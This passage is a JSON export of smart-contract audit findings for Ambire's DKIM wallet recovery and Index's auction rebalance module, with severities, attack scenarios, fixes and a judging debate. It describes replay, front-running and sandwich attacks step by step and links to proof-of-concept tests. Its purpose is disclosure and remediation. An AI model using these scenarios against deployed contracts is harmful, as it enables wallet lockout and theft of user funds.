      "summary": "\nThis bug report discusses a problem with the `DKIMRecoverySigValidator` contract, which can lead to blocked recoveries or loss of wallet access. The issue is caused by fields in the `AccInfo` struct that are not properly validated. These include the `secondaryKey` field, which can be set to the zero address, and the `waitUntilAcceptAdded` and `waitUntilAcceptRemoved` fields, which can have values that are too large. This can result in the inability to add or remove DKIM keys, and in some cases, the recovery process can be locked forever. The report recommends adding limits for the time values and checking that the `secondaryKey` field is not set to the zero address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2023-09-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "34023",
      "title": "[H-01] Recoveries of type `SigMode.OnlySecond` can be endlessly replayed",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:**\nHigh, as it can result in a loss of wallet access\n\n**Likelihood:**\nMedium, as it requires specific conditions but they can happen even after years of using the wallet\n\n**Description**\n\nThe `recoveries` mapping in `DKIMRecoverySigValidator` is serving as a way to check if a `recovery` has been executed already, so it is a way to block recovery replays. The problem with this is that the key in that mapping is calculated from fields in a recovery payload that can be slightly changed (for example by adding a random character to a `string` or `bytes` typed field, examples are `SignatureMeta.canonizedHeaders` or `SignatureMeta.key.pubKeyModulus`) so you can execute a recovery payload where all other values are the same.\n\nThe concrete problem is here:\n\n```solidity\nbytes32 identifier = keccak256(abi.encode(accountAddr, data, sigMeta));\n```\n\nThe `identifier` which is used as a key in the `recoveries` mapping, is using `SignatureMeta sigMeta` which has the `string canonizedHeaders` field. When `SigMode.OnlySecond` is used, the `canonizedHeaders` has no validation whatsoever, so it can be slightly changed and the `identifier` would be different, while all other values are the same and still valid. This means that all `SigMode.OnlySecond` recoveries can be replayed endlessly - as many times as desired, forever.\n\nThe problem is deflated by the fact that the `SignatureMeta.newKeyToSet` value can't be changed (it is validated when `SigMode.onlySecond` is used), so all of the mentioned replays will end up granting access to the same `newKeyToSet` address every time they are executed. Still, let's look at the following scenario:\n\n1. Alice lost access to her `AmbireAccount` so she executes a recovery using `DKIMRecoverySigValidator` with `SigMode.OnlySecond`, which gives control over her `AmbireAccount` to the address she set in `SignatureMeta.newKeyToSet`\n2. A year passes by, Alice rotates her keys and now throws away the old ones\n3. Bob replays her previous recovery by slightly changing the `canonizedHeaders` field which results in that same address (which Alice now doesn't control) to control her `AmbireAccount`\n4. Now Alice has lost control over her wallet and can't recover it, since the recovery is configured to work only for the previously set `SignatureMeta.newKeyToSet`\n\n**Recommendations**\n\nWhen crafting the `identifier` key for the `recoveries` mapping, possibly use only the fields from `SignatureMeta` that are validated in all code paths, so that recovery replays are not possible.",
      "summary": "\nThis bug report discusses a problem with the `recoveries` mapping in `DKIMRecoverySigValidator` that can result in a loss of wallet access. The issue is caused by using the `SignatureMeta.sigMeta` field, which can be slightly changed, as the key for the mapping. This allows for replay attacks, where a recovery can be executed multiple times, giving control of the wallet to a different address each time. While the `SignatureMeta.newKeyToSet` value cannot be changed, making all replays grant access to the same address, this can still result in a loss of control over the wallet. The recommendation is to only use validated fields from `SignatureMeta` when creating the `identifier` key for the `recoveries` mapping to prevent replay attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2023-09-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "34022",
      "title": "[C-03] Anyone can block single signature DKIM recoveries",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:**\nHigh, as the user won't be able to recover access to his wallet\n\n**Likelihood:**\nHigh, as anyone can execute this attack by front-running a recovery\n\n**Description**\n\nIn `DKIMRecoverySigValidator` there is a mechanism for single signature recoveries. The catch is that if you use it, you will have to have a timelock on your recovery, which is a predefined number (should be set in `AccInfo.onlyOneSigTimelock`). Until a timelock expires the wallet access can't be recovered. The problem here is that the `checkTimelock` method that actually sets a lock for an `identifier` (which is built by hashing some recovery data) is `public`, so anyone can call it. This means that anyone can front-run a `validateSig` call with a `checkTimelock` one, setting a huge `time` until unlock of the recovery, basically blocking it.\n\n[Here is a Github gist link](https://gist.github.com/pashov/8a9956d918045c73425177600c497ac2) to a Proof of Concept unit test to see the attack in action (you can put it in the `'DKIM sigMode OnlySecond with a timelock of 2 minutes'` suite in `DKIMTest.ts` to run it).\n\n**Recommendations**\n\nChange the `checkTimelock` method from `public` to `private` so it can only be called internally by `validateSig`, or just inline the method.",
      "summary": "\nThe bug report describes a problem with the `DKIMRecoverySigValidator` mechanism, which is used for single signature recoveries. The issue is that the `checkTimelock` method, which is responsible for setting a time lock on the recovery, is currently set to `public`, meaning anyone can call it. This allows for an attack where someone can front-run a `validateSig` call with a `checkTimelock` one, effectively blocking access to the wallet until a predefined time. To fix this, the `checkTimelock` method should be changed to `private` or simply inline it. This is a high severity issue as it can prevent users from accessing their wallets and has a high likelihood of occurring. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2023-09-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "34021",
      "title": "[C-02] Recoveries can be blocked by front-running",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:**\nHigh, as recovery functionality won't be usable\n\n**Likelihood:**\nHigh, as there are no preconditions to executing such an attack on all recoveries\n\n**Description**\n\nEach call from `AmbireAccount` to `DKIMRecoverySigValidator::validateSig` can be front-runned by calling the method with the same arguments, which will set the value in the `recoveries` mapping for the recovery payload to `true`, making the actual transaction revert due to this check:\n\n```solidity\nrequire(!recoveries[identifier], 'recovery already done');\n```\n\n[Here is a Github gist link](https://gist.github.com/pashov/6f85756cca9aedfb059f082e71e138c7) to a Proof of Concept unit test to see the attack in action (you can put it in the `'DKIM sigMode Both'` suite in `DKIMTest.ts` to run it).\n\n**Recommendations**\n\nIn `validateSig` just use `msg.sender` instead of the `accountAddress` parameter. This will prevent anyone from sending the `accountAddress` to be the `AmbireAccount` one.",
      "summary": "\nIn this bug report, it is stated that there is a high severity issue in the `AmbireAccount` and `DKIMRecoverySigValidator` code that could impact the usability of the recovery functionality. This issue has a high likelihood of occurring as there are no preconditions to prevent it.\n\nThe report explains that there is a vulnerability in the code that allows someone to front-run a call from `AmbireAccount` to `DKIMRecoverySigValidator::validateSig` by using the same arguments. This sets the value in the `recoveries` mapping to `true`, causing the transaction to fail due to a check in the code.\n\nA link to a Proof of Concept unit test is provided to demonstrate the attack in action, and it is recommended to make a change in the `validateSig` function to prevent this issue. The recommendation is to use `msg.sender` instead of the `accountAddress` parameter, which will prevent anyone from sending the `accountAddress` to be the same as the `AmbireAccount` one. \n\nOverall, this bug report highlights a critical issue in the code that needs to be addressed to ensure the proper functioning of the recovery functionality. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2023-09-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "34020",
      "title": "[C-01] Recoveries of type `SigMode.OnlyDKIM` can be reverted by anyone",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:**\nHigh, as the recovery will be reverted and the user still won't be able to gain access to his smart wallet\n\n**Likelihood:**\nHigh, as anyone can execute this attack when `SigMode.OnlyDKIM` is used for recovery\n\n**Description**\n\nThe way in which the recoveries in `DKIMRecoverySigValidator::validateSig` work are that when a recovery is executed, the `sigMeta.newAddressToSet` address will be granted `sigMeta.newPrivilegeValue` privileges. In `AmbireAccount` when an address has non-zero privileges he is allowed to execute anything in the smart wallet, making him an owner of it. The problem with this is that the `sigMeta.newPrivilegeValue` is not validated.\n\nIf a user uses a recovery of type `SigMode.OnlyDKIM` and sends a recovery transaction to set address \"X\" to have privilege of \"1\", now a timelock will be set, after which the user can send the same transaction again and the \"X\" address will have a privilege of \"1\". Now it is possible that a malicious attacker uses the same transaction payload that the user used but just by changing the `data` of the first `Transaction` in the `calls` argument in `DKIMRecoverySigValidator::validateSig` and setting the `sigMeta.newPrivilegeValue` to 0, now a new recovery will be started which will set the \"X\" address so that it doesn't have privileges anymore. This will work as the `identifier` for the recovery will be different, since `sigMeta` is part of the `identifier` calculation and is now different.\n\nThere are variations of this attack - the malicious user can back-run the normal user's `SigMode.OnlyDKIM` transaction, so he will be able to execute his timelock just after the user does.\n\n[Here is a Github gist link](https://gist.github.com/pashov/f154ecb2be94e672324e9df122e15617) to a Proof of Concept unit test to see the attack in action (you can put it in the `'DKIM sigMode OnlyDKIM'` suite in `DKIMTest.ts` to run it).\n\n**Recommendations**\n\nFor recoveries only allow `sigMeta.newPrivilegeValue == 1` or remove `sigMeta.newPrivilegeValue` from the `identifier` construction.",
      "summary": "\nThis bug report discusses a problem with the way recoveries are executed in a program called `DKIMRecoverySigValidator`. When a user performs a recovery, the address they specify is granted certain privileges. However, there is a flaw in the system that allows a malicious attacker to change the privileges of the specified address, even if they are not authorized to do so. This can be done by altering the `data` of a transaction and setting the `sigMeta.newPrivilegeValue` to 0. This can have a high impact on the user, as their recovery will be reverted and they will still not be able to access their smart wallet. The likelihood of this attack is high, as it can be executed by anyone using a specific recovery method. The report recommends either only allowing `sigMeta.newPrivilegeValue` to be set to 1, or removing it from the recovery process altogether. A proof of concept unit test is also provided for further understanding.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2023-09-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "20910",
      "title": "M-7: Malicious users can exploit the auction and make profit when the SetToken is not locked.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-06-Index-judging/issues/57 \n\n## Found by \nast3ros\n## Summary\n\nThe SetToken can be minted and redeemed by anyone when it is not locked during rebalancing. This can allow malicious users to front-run and back-run the bidders and manipulate the auction outcome.\n\n## Vulnerability Detail\n\nWhen rebalancing, the token manager can configure if the SetToken is locked or not. If the SetToken is not locked, anyone can mint and redeem the SetToken using BasicIssuanceModule. The token manager can also configure the pricing mechanism via the priceAdapter. There are some mechanisms:\n- ConstantPriceAdapter: the price is fixed - similar to place limit orders.\n- BoundedStepWise adapters: like Dutch Auction which the price can increase/decrease over time.\n\nLet's see an example: \n\nThe current price of WETH is 1940 USDC.\nTotal supply of the SetToken is 10.\n\nA Set Token with component WETH and current unit(1 WETH) wants to achieve target unit (0.5 WETH - 975 USDC).\n- Current unit: 1 WETH => Current notional: 10 WETH\n- Target unint: 0.5 WETH - 975 USDC => Target notional: (5 WETH - 9750 USDC)\n\nTo achieve this, it needs to sell WETH to buy USDC. The manager starts rebalancing using linear price curve: start at $2000, lower to minimum $1900, take steps of $0.1 every minute. It also chooses USDC as the quote token.\n\nAssuming when the price of WETH reaches 1950 USDC, a bidder bids for all of the available WETH for the rebalance process, which is 0.5 WETH per Set Token or 5 WETH in total for 9750 USDC (5*1950). The expected result should be that the SetToken will meet the target and the rebalancing process will finish. The end position will be:\n\n- Expected position: 0.5 WETH - 975 USDC => Expected notional (5 WETH - 9750 USDC)\n\nHowever, the module is deployed on mainnet and polygon, a malicious user can front-run the bidder and mint the SetToken to make profit and disrupt the auction. The malicious user mints 10 SetToken using 10 WETH. It increases the total supply of the SetToken to 20.\n\n- After the malicious user front-run the bidder: \n    - Current unit: 1 WETH => Current notional: 20 WETH.\n    - Target unit: 0.5 WETH - 975 USDC => Target notional: (10 WETH - 19500 USDC)\n- After bidder bids 5 WETH for 9750 USDC:\n    - Current: 0.75 WETH - 487.5 USDC => Current notional: (15 WETH - 9750 USDC)\n\nAfter that, the malicious user can back-run the bidding transaction and redeem his 10 SetToken for 7.5 ETH and 4875 USDC. Malicious user balance:\n\n- Before: 10 WETH = 19400 USDC\n- After: 7.5 WETH + 4875 USDC = 7.5 * 1940 + 4875 = 19425 USDC.\n\nThe malicious user can make a profit of 25 USDC and disrupt the auction because the auction cannot finish as it should be.\n\nHe cannot make a profit directly by bidding because the bidder may need to be whitelisted by the manager.\n\nIn conclusion, if the price of auction is above the market price and a bid is placed, a malicious user can front-run and back-run the bidder and make a profit and disrupt the auction in the unlocked rebalancing process.\n\n## Impact\n\nThe malicious user can make a profit and prevent the auction from meeting the target and finishing.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L254-L257\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe SetToken should be always locked when rebalancing.\n\n\n\n\n## Discussion\n\n**thangtranth**\n\nEscalate\n\nThis is not the duplication of #21 since it does not require ERC777. Please help to review.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is not the duplication of #21 since it does not require ERC777. Please help to review.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**pblivin0x**\n\n`In conclusion, if the price of auction is above the market price and a bid is placed, a malicious user can front-run and back-run the bidder and make a profit and disrupt the auction in the unlocked rebalancing process.`\n\nIf the bidder is bidding on an auction that is above market price, then yes, there is profit to be made in the system. That is by design. \n\nAn example of this would be a bidder desperate to exit a position, and willing to incur slippage to exit, just so happens that the exit is market making the SetToken auction. \n\nInvalid issue, note that we've added logic to settle remaining units as part of remediation for #41 \n\n**hrishibhat**\n\n@thangtranth \n\n**pblivin0x**\n\nFor the security purposes of this audit, it can be considered that the price set by the trusted SetToken manager is valid, and any NAV decay of the SetToken needs to be measured against these prices. \n\nBy allowing bid's, mints, and redeems there is no clear way to decay NAV as defined by the auction prices.\n\nAny arbitrage open between the auction prices and market prices is to be handled by the SetToken manager. \n\n**thangtranth**\n\nHi @pblivin0x,\n\n> If the bidder is bidding on an auction that is above market price, then yes, there is profit to be made in the system. That is by design.\n\nIn this issue, it shows that the profit goes to the malicious user who is not the current SetToken holder. He only buys SetToken when there is a profit bidding auction and sells immediately after that by back running. \n\nHe can make **risk free money** and can **prevent** the auction from getting the target. In the example above, if the bidder bids 9750 USDC, the auction should be completed, however it is not because profit is extracted by malicious user.  Actually a MEV can increase the buying and selling amount and extract most of the profit from the bidding.\n\nBecause the protocol is deployed in mainnet and polygon then it is very common to happen. Therefore it should be addressed.\n\n> An example of this would be a bidder desperate to exit a position, and willing to incur slippage to exit, just so happens that the exit is market making the SetToken auction.\n\nThere is nothing wrong with the bidder here. He gets his expected bidding price for the assets.\n\n\n\n\n\n\n**pblivin0x**\n\n> Hi @pblivin0x,\n> \n> > If the bidder is bidding on an auction that is above market price, then yes, there is profit to be made in the system. That is by design.\n> \n> In this issue, it shows that the profit goes to the malicious user who is not the current SetToken holder. He only buys SetToken when there is a profit bidding auction and sells immediately after that by back running.\n> \n> He can make **risk free money** and can **prevent** the auction from getting the target. In the example above, if the bidder bids 9750 USDC, the auction should be completed, however it is not because profit is extracted by malicious user. Actually a MEV can increase the buying and selling amount and extract most of the profit from the bidding.\n> \n> Because the protocol is deployed in mainnet and polygon then it is very common to happen. Therefore it should be addressed.\n> \n> > An example of this would be a bidder desperate to exit a position, and willing to incur slippage to exit, just so happens that the exit is market making the SetToken auction.\n> \n> There is nothing wrong with the bidder here. He gets his expected bidding price for the assets.\n\nMy current understanding is this, I would love to get more opinions.\n\n---\n\n**If**: \n+ A `bid()` is placed on a `component` sell auction\n+ The auction price is greater than the price perceived by some external actor\n\n**Then**: \n+ The external actor can sandwich attack the `bid()` by issuing a size much greater than `totalSupply`, allowing the `bid()` to go through, and redeeming the same size. The full perceived value difference can be extracted.\n+ The SetToken manager and holders do not have sufficient protections that a `bid()` will push the `positionUnit` closer to the `targetUnit` by an amount proportional to `componentAmount` and `totalSupply` before the bid. \n\n**Fix**: \n+ Apply a supply cap on `SetToken.totalSupply` when the manager calls `startRebalance()`. This will facilitate honest issuance and redemption while preventing the size needed for effective sandwich attacks. \n\n---\n\nIf there is no supply cap on an unlocked auction, then anytime a malicious actor sees a `bid()` at a price sufficiently higher than their perceived price, then the malicious actor `can make risk free money and can prevent the auction from getting the target.` - @thangtranth \n\n**FlattestWhite**\n\n```\nAfter that, the malicious user can back-run the bidding transaction and redeem his 10 SetToken for 7.5 ETH and 4875 USDC. Malicious user balance:\n\nBefore: 10 WETH = 19400 USDC\nAfter: 7.5 WETH + 4875 USDC = 7.5 * 1940 + 4875 = 19425 USDC.\n```\nWhy is Before 10 WETH = 19400 USDC? Isn't it 10 WETH = 19500 USDC\nAfter: 7.5 WETH + 4875 USDC = 7.5 * 1950 + 4875 = 19500 USDC\n\n**pblivin0x**\n\nWould a mint/redeem fee prevent the sandwich attack? @thangtranth \n\n**thangtranth**\n\n> Would a mint/redeem fee prevent the sandwich attack? @thangtranth\n\nI think it makes the attack more expensive. Then the attacker needs to consider the amount of fees that he has to pay for mint + redeem and the profit gained (the gap between bid price and current price). If we config the fees large enough then it may. However honest users will have to pay the fee as well.\n\n**thangtranth**\n\n> ```\n> After that, the malicious user can back-run the bidding transaction and redeem his 10 SetToken for 7.5 ETH and 4875 USDC. Malicious user balance:\n> \n> Before: 10 WETH = 19400 USDC\n> After: 7.5 WETH + 4875 USDC = 7.5 * 1940 + 4875 = 19425 USDC.\n> ```\n> \n> Why is Before 10 WETH = 19400 USDC? Isn't it 10 WETH = 19500 USDC After: 7.5 WETH + 4875 USDC = 7.5 * 1950 + 4875 = 19500 USDC\n\nPlease refer to the scenario: The current price of WETH is 1940 USDC.\nThe 1950 is the price of the bid from bidder.\n\n\n**0xauditsea**\n\nI don't think this is valid, when those kind of MEV is allowed, auction managers will allow tokens not being locked, but otherwise `_shouldLockSetToken` will be set to true.\n\n**thangtranth**\n\n> I don't think this is valid, when those kind of MEV is allowed, auction managers will allow tokens not being locked, but otherwise `_shouldLockSetToken` will be set to true.\n\nHi, it is already confirmed with the protocol team that this is not the intended behaviour when MEV is allowed when unlocked.\nFrom the protocol team:\n> it is concerning...it is ideal for SetToken's to actually not be locked during rebalancing bc we want users to always have access to their underlying\n\n**bizzyvinci**\n\nThe issue with this issue is that it assumes a logical bidder would trade at a loss against SetToken.\n\n\nI'll start with some axioms which I believe are True\n\n* market is DEX. market price is DEX price.\n* No logical bidder would trade at a loss. Because bidders would want to trade at a DEX instantly for profit.\n* price is how much quoteAsset you need to purchase 1 component (which is base asset).\n* Minting and burning does not manipulate unit.\n* Notional values are what's minted, burned and traded, which is equal to `unit * tokenAmount` (tokenAmount could be totalSupply).\n\n\nIf the axioms listed above are True. Then the following should be True\n* SetToken would sell component at a price lower than market/DEX. So that bidder would buy it and sell on DEX for an instant profit.\n* SetToken would buy component at a price higher than market/DEX. So that bidder would buy it cheaper on DEX and sell it for SetToken for an instant profit.\n* SetToken is trading at a discount loss compared to market.\n\nP.S: Another reason I believe SetToken is comfortable at trading at discount loss is because Auction could be used against DEX slippage or as an order book that would be executed at a future time when price reaches the limit set by manager.\n\n\nAnd\n* If totalSupply increases when SetToken is selling component, It would be provided with more component notional to sell at a loss. Because It needs more component notional to buy quoteAsset at a loss.\n* If totalSupply increases when SetToken is buying component, It would be provided with more quote notional to sell at a loss. Because It needs more quote notional to buy component at a loss.\n* The loss is distributed to all holders of SetToken\n\nP.S: quote asset must be a component for second point to be True. And I believe that's done because the contract [checks that bidded component is not quoteAsset](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L750) to avoid attacks when quoteAsset is part of SetToken components. And most importantly, it updates both quoteAsset and bidded component position [here](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L997-L1008).\n\nTherefore:\n* Higher notional means SetToken is provided with more tokens to trade at a loss to market/DEX.\n* Anyone sandwiching this trade by minting and burning SetToken is partaking in the loss.\n\n\nUsing numbers would be more complicated cause there are several parameters. And the proof provided by the issue is flawed because SetToken is selling component at a price higher than market/DEX. This means that bidder is taking a loss and SetToken is taking a profit. That's the source of the $25. Proof:\n* Price of 1900-2000 means USDC is quote asset while WETH is component (base asset)\n* SetToken is selling WETH for USDC\n* A bidder decides to buy it 1950 which is higher than 1940 of market price\n* The bidder bought 5 WETH, so the bidder loses $50 while the SetToken gains $50\n* Since the sandwicher owns 50% of supply, they get 50% of $50 which is $25\n\nIf the bidder is logical he would wait till price is below market price so that he'll make a profit on the trade. Therefore sandwicher would take part in the loss.\n\n\n**sinarette**\n\n> Should not be able to decay the SetToken Net-Asset-Value according to this price. with any combination of actions (bids, mints, or redeems)\n\nAccording to the contest readme it requires damage calculated according to the bid price.\nHere the stated attack scenario is just buying ETH at 1940 USDC and selling at 1950 USDC; we don't tell this kind of profitable trading stategy an 'attack'. In fact, in ETH units it's not a profit; the attacker who had 19400/1940 = 10 ETH now has 19425/1950 = 9.96 ETH.\n\n**pblivin0x**\n\nAgree with @bizzyvinci here that bidder's in the system are expected to be rationale profit seeking actors - ` If the bidder is logical he would wait till price is below market price so that he'll make a profit on the trade. Therefore sandwicher would take part in the loss.`\n\n**thangtranth**\n\nYes, I also agree with @bizzyvinci . A very good point about rationale bidder \n\n**pblivin0x**\n\nThank you for all the input here @thangtranth @bizzyvinci @0xauditsea @sinarette @Oot2k \n\nAfter much consideration I'm of the following opinion\n+ When a `bid()` is placed on a component sell auction that is above market price, a malicious actor can sandwich attack the `bid()`, and prevent the `bid()` from contributing meaningfully towards the auction getting closer to target. \n+ Bidders are expected to be rationale profit-seeking actors, so the situation where a `bid()` is placed above market price is not expected to happen often.\n+ To prevent such a sandwich attack, a reasonable supply cap can be placed on the SetToken, such that normal user issuance and redemption is possible, but large sandwich attack issuance is not possible. \n\nIndex is prepared to take the following remediations\n+ Add a warning about sandwich attacks on unlocked rebalances to the `AuctionRebalanceModuleV1` natspec\n+ In production, utilize a supply cap on the SetToken during unlocked rebalances (e.g., 2x supply at the start of rebalance)\n\nI believe this is a Medium severity issue because\n+ While the sandwich attack requires that the bidder is acting \"irrationally\" and is not expected to happen often, part of the dutch auction mechanism is that the auctioneer benefits from poorly priced bids. This sandwich attack could take all the benefits from the auctioneer, by preventing the auction from getting any closer to target. \n+ This is exactly the edge case I wanted examined during the audit, with the addition of broader market dynamics - `Should not be able to decay the SetToken Net-Asset-Value according to this price. with any combination of actions (bids, mints, or redeems)` https://github.com/sherlock-audit/2023-06-Index#q-are-there-any-additional-protocol-roles-if-yes-please-explain-in-detail\n+ Index is taking meaningful remediations from this issue\n\n\n**Oot2k**\n\nAgree with escalation and agree that this is valid.\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nConsidering this a medium issue based on above comments \nhttps://github.com/sherlock-audit/2023-06-Index-judging/issues/57#issuecomment-1666224199\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [thangtranth](https://github.com/sherlock-audit/2023-06-Index-judging/issues/57/#issuecomment-1658144838): accepted\n\n**pblivin0x**\n\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25\n\nThe changes are to add warnings to use a supply cap in order to avoid large front running issuance and redemption\n+ https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L48-L51\n+ https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L239",
      "summary": "\nA bug report has been raised regarding SetToken, a token manager that can configure the pricing mechanism in a rebalancing process. The issue is that when the SetToken is not locked, anyone can mint and redeem the SetToken using the BasicIssuanceModule, allowing malicious users to front-run and back-run bidders and manipulate the auction outcome. This can allow a malicious user to make a profit and disrupt the auction, preventing it from meeting the target and finishing. \n\nThe bug report provides an example of how a malicious user can exploit the auction. In the example, the current price of WETH is 1940 USDC, and the total supply of the SetToken is 10. A Set Token with component WETH and current unit (1 WETH) wants to achieve target unit (0.5 WETH - 975 USDC). The manager starts rebalancing using a linear price curve, and a bidder bids for all of the available WETH for the rebalance process, which is 0.5 WETH per Set Token or 5 WETH in total for 9750 USDC (5*1950). \n\nHowever, a malicious user can front-run the bidder and mint the SetToken to make a profit and disrupt the auction. The malicious user mints 10 SetToken using 10 WETH, increasing the total supply of the SetToken to 20. After the malicious user front-runs the bidder, the target notional is (10 WETH - 19500 USDC). After the bidder bids 5 WETH for 9750 USDC, the current notional is (15 WETH - 9750 USDC). After that, the malicious user can back-run the bidding transaction and redeem his 10 SetToken for 7.5 ETH and 4875 USDC. The malicious user can make a profit of 25 USDC and disrupt the auction because the auction cannot finish as it should be.\n\nThe issue has been discussed by several people, with some believing it to be invalid because it assumes a logical bidder would trade at a loss against SetToken, and others believing that the SetToken should be always locked when rebalancing. It has been agreed that a supply cap should be applied on SetToken.totalSupply when the manager calls startRebalance() to facilitate honest issuance and redemption while preventing the size needed for effective sandwich attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Index Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-06-Index-judging/issues/57",
      "tags": [
        "Front-Running",
        "Auction"
      ],
      "finders": [
        "ast3ros"
      ]
    },
    {
      "id": "20909",
      "title": "M-6: Target raises can be highly damaging for dutch auctions with multiple components",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-06-Index-judging/issues/45 \n\n## Found by \n0x52\n## Summary\n\nMulti-component dutch auctions are fundamentally incompatible with target raises and will lead to inefficient pricing causing loss to set token.\n\n## Vulnerability Detail\n\nThe AuctionRebalanceModuleV1 allows targets to be increased when all component targets have been met and there is still excess quote token. When combined with multiple components, it his highly likely that these target raises will lead to inefficient pricing which will cause loss to the set token.\n\nConsider the following a set token has the following composition that has target raises enabled:\n\n40% USDC\n30% WBTC\n30% WETH\n\nThe manager wishes to rebalance the set to the following using USDC as the quote token:\n\n20% USDC\n40% WBTC\n40% WETH\n\nAssume the WETH portion of the execute within the first hour of the auction. The WBTC on the other hand doesn't execute until 12 hours in. Assume there is excess quote so the target is increased. The issue is that now because of the change in time, the WETH auction is now well above the market price. This buys the WETH for a large loss compared to the market price of WETH.\n\n## Impact\n\nPricing after target raises will likely be heavily skewed from market prices for some components lead to set token losses\n\n## Code Snippet\n\n[AuctionRebalanceModuleV1.sol#L359-L380](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L359-L380)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nTarget raises should reset `rebalanceStartTime` allowing the dutch auction to restart and properly price the assets\n\n\n\n## Discussion\n\n**pblivin0x**\n\nAgree, especially since the raising of targets is onlyAllowedBidder, we should reset the pricings. \n\nIn the fix, I think we will make it such that the rebalance still ends at the same time. \n\n**bizzyvinci**\n\nEscalate\n\nThis is invalid. Let's take a look at why would we would raise target based on the [docs](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L351)\n```solidity\n* @dev ACCESS LIMITED: Increases asset targets uniformly when all target units have been met but there is remaining quote asset.\n```\n\nraiseAssetTarget is meant for uniformly raising targets **when all target units have been met**. Everything else (such as price and ratio) can be resolved by calling `startRebalance`.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is invalid. Let's take a look at why would we would raise target based on the [docs](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L351)\n> ```solidity\n> * @dev ACCESS LIMITED: Increases asset targets uniformly when all target units have been met but there is remaining quote asset.\n> ```\n> \n> raiseAssetTarget is meant for uniformly raising targets **when all target units have been met**. Everything else (such as price and ratio) can be resolved by calling `startRebalance`.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\n@bizzyvinci Could you please elaborate a bit further as to what exactly is invalid about the points raised in the issue?\n\n**bizzyvinci**\n\nFirst of all, I believe the auction buy and sell is to be used instead of trade module and this was mentioned on the [discord channel](https://discord.com/channels/812037309376495636/1127977547372703764/1128308198722523216). And the way it works is that it provides discount over market price to motivate bidder. And this discount increases linearly, exponential or logarithmically.\n\nAnd an assumption is that the discount will start low e.g 0% till a cap the manager is comfortable with e.g 5%. Whether you're buying or selling, the focus is on `discount` and that's why price would decrease during sell and price would increase during buy of quoteAsset. The price change is the discount and that's what grows or fall with the mathematical equation.\n\n\nAssuming manager/operator wants to move from 40% USDC, 30% WBTC, 30% WETH\n\nTo 20% USDC, 40% WBTC, 40% WETH using USDC\n\nIf after an hour, the ratio are 35% USDC, 30% WBTC, 35% WETH. It's safe to assume that price on WETH was too good but price on WBTC wasn't. The operator can call `startRebalance` to **update this prices**.\n\nIf the price is indeed good and the market/whale is just crazy for WBTC and it reaches 30% USDC, 30% WBTC, 40% WETH. Then no one can bid on WETH again, because of the following 